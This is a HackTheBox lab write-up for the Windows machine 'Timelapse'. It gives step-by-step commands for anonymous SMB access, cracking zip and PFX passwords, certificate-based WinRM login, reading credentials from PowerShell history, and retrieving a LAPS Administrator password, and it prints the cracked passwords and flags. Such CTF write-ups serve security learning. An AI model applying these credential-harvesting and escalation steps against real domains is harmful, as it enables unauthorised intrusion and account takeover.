# HTB — Timelapse

![Platform](https://img.shields.io/badge/Platform-HackTheBox-9FEF00?style=flat-square&logo=hackthebox&logoColor=black)
![OS](https://img.shields.io/badge/OS-Windows-0078D6?style=flat-square&logo=windows&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=flat-square)
![Techniques](https://img.shields.io/badge/Techniques-LAPS%20%7C%20PFX%20Auth%20%7C%20PSHistory-blueviolet?style=flat-square)

---

## Summary

Timelapse is a Windows Active Directory machine that chains together anonymous SMB enumeration, certificate cracking, PowerShell history credential harvesting, and LAPS password retrieval to achieve full domain compromise. The entry point is a WinRM backup zip file on an open share containing a password-protected PFX certificate. After cracking both the zip and PFX passwords, the certificate is used to authenticate directly to WinRM over HTTPS. PowerShell history on the foothold user reveals credentials for a service account that has LAPS read permissions, allowing direct retrieval of the local Administrator password from Active Directory.

---

## Machine Info

| Field | Details |
|---|---|
| IP | 10.129.227.113 |
| Domain | timelapse.htb |
| DC Hostname | DC01 |
| FQDN | dc01.timelapse.htb |
| OS | Windows Server |
| User Flag | `623fc580dcca90599697a0b708b55d7c` |
| Root Flag | `39d9649ce43b49f2e5dcc4e5b9f769b0` |

---

## Attack Path Overview

```
Anonymous SMB
     |
     | Shares\Dev\winrm_backup.zip
     v
zip2john + john → supremelegacy
     |
     | legacyy_dev_auth.pfx
     v
pfx2john + john → thuglegacy
     |
     | openssl pkcs12 extract
     v
legacyy.crt + legacyy.key
     |
     | evil-winrm -c -k -S
     v
WinRM shell as legacyy + user flag
     |
     | PowerShell history
     v
svc_deploy : E3R$Q62^12p7PLlC%KWaxuaV
     |
     | BloodHound → LAPS_READERS → ReadLAPSPassword
     v
ldapsearch ms-Mcs-AdmPwd
     |
     | Administrator LAPS password
     v
evil-winrm as Administrator + root flag (TRX profile)
```

---

## Enumeration

### Port Scanning

**Phase A — Wide coverage:**
```bash
nmap -p- --min-rate 1000 -oN timelapse-all-ports.txt 10.129.227.113
```

**Extract ports for Phase B:**
```bash
grep "^[0-9]" timelapse-all-ports.txt | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//'
```

**Phase B — Deep identification:**
```bash
nmap -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49693 --min-rate 1000 -oN timelapse-service-scan.txt 10.129.227.113
```

**Key findings:**

| Port | Service | Significance |
|---|---|---|
| 88 | Kerberos | Confirms Domain Controller |
| 389/636/3268/3269 | LDAP | AD enumeration |
| 445 | SMB | Anonymous share enumeration |
| 5986 | WinRM HTTPS | Shell delivery via certificate |

Additional findings:
- Domain: `timelapse.htb`
- Hostname: `DC01`
- SMB signing required
- Clock skew: 8 hours — must sync before Kerberos attacks
- SSL cert CN: `dc01.timelapse.htb`

**Clock sync:**
```bash
sudo timedatectl set-ntp off
sudo date -s "$(date -d "$(date) + 8 hours" '+%Y-%m-%d %H:%M:%S')"
```

```bash
echo "10.129.227.113 timelapse.htb dc01.timelapse.htb" | sudo tee -a /etc/hosts
```

### SMB Enumeration

```bash
smbclient -L //10.129.227.113 -N
smbclient //10.129.227.113/Shares -N -c "recurse ON; ls"
```

Non-standard share `Shares` accessible anonymously with two subfolders:

`Dev\winrm_backup.zip` — custom WinRM backup, immediately suspicious.

`HelpDesk\` — LAPS installer and documentation, confirming LAPS is deployed on the domain.

```bash
smbclient //10.129.227.113/Shares -N
get Dev\winrm_backup.zip
```

---

## Foothold

### Cracking the Zip

```bash
zip2john winrm_backup.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Zip password:** `supremelegacy`

```bash
unzip -P supremelegacy winrm_backup.zip
```

Extracts `legacyy_dev_auth.pfx`.

### Cracking the PFX

The PFX has a separate password from the zip.

```bash
pfx2john legacyy_dev_auth.pfx > pfx.hash
john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**PFX password:** `thuglegacy`

### Extracting Certificate and Key

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy.key -nodes -passin pass:thuglegacy
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out legacyy.crt -passin pass:thuglegacy
```

### WinRM Shell

```bash
evil-winrm -i 10.129.227.113 -c legacyy.crt -k legacyy.key -S
```

```powershell
type C:\Users\legacyy\Desktop\user.txt
```

**User flag:** `623fc580dcca90599697a0b708b55d7c`

---

## Privilege Escalation

### PowerShell History

```powershell
type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

History contains plaintext credentials:

```
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl ...
```

Credentials: `svc_deploy` / `E3R$Q62^12p7PLlC%KWaxuaV`

### BloodHound Collection

```bash
bloodhound-python -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb -dc dc01.timelapse.htb -ns 10.129.227.113 -c all
```

**Attack path discovered:**

```
SVC_DEPLOY@TIMELAPSE.HTB
    MemberOf
LAPS_READERS@TIMELAPSE.HTB
    ReadLAPSPassword
DC01.TIMELAPSE.HTB
```

### Reading the LAPS Password

```bash
ldapsearch -x -H ldap://10.129.227.113 -D "timelapse\svc_deploy" -w 'E3R$Q62^12p7PLlC%KWaxuaV' -b "DC=timelapse,DC=htb" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd
```

**LAPS password:** `k7wgc8l3u2!189}l)T7&&6TA`

### Administrator Shell

```bash
evil-winrm -i 10.129.227.113 -u Administrator -p 'k7wgc8l3u2!189}l)T7&&6TA' -S
```

```powershell
dir C:\Users\
type C:\Users\TRX\Desktop\root.txt
```

Note: Root flag is in the TRX user profile, not the Administrator desktop.

**Root flag:** `39d9649ce43b49f2e5dcc4e5b9f769b0`

---

## Vulnerabilities

| Vulnerability | Location | Impact |
|---|---|---|
| WinRM certificate backup on anonymous SMB | Shares\Dev | Certificate-based shell access |
| Weak zip password | winrm_backup.zip | Archive extraction |
| Weak PFX password | legacyy_dev_auth.pfx | Certificate and key exposure |
| Plaintext credentials in PowerShell history | ConsoleHost_history.txt | svc_deploy compromise |
| LAPS password readable by service account | ms-Mcs-AdmPwd on DC01 | Full domain compromise |

---

## Tools

| Tool | Purpose |
|---|---|
| nmap | Port and service scanning |
| smbclient | Anonymous SMB enumeration |
| zip2john | Zip hash extraction |
| pfx2john | PFX hash extraction |
| john | Password cracking |
| openssl | Certificate and key extraction |
| evil-winrm | WinRM shell over HTTP and HTTPS |
| bloodhound-python | AD attack path collection |
| ldapsearch | LAPS password retrieval |

---

## Key Takeaways

1. Port 5986 is WinRM over HTTPS. Always use -S with evil-winrm when connecting to this port.
2. Zip and PFX files can have completely different passwords. Crack them independently.
3. PowerShell history is one of the highest value files to check immediately after every foothold.
4. LAPS_READERS group membership plus ReadLAPSPassword equals direct Administrator password retrieval via ldapsearch.
5. The root flag is not always on the Administrator desktop. Always list C:\Users\ when a flag is missing from the expected path.

---

## References

- [LAPS Documentation](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [evil-winrm SSL authentication](https://github.com/Hackplayers/evil-winrm)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

---

*by mavhezha | github.com/mavhezha | mavhezha.com*
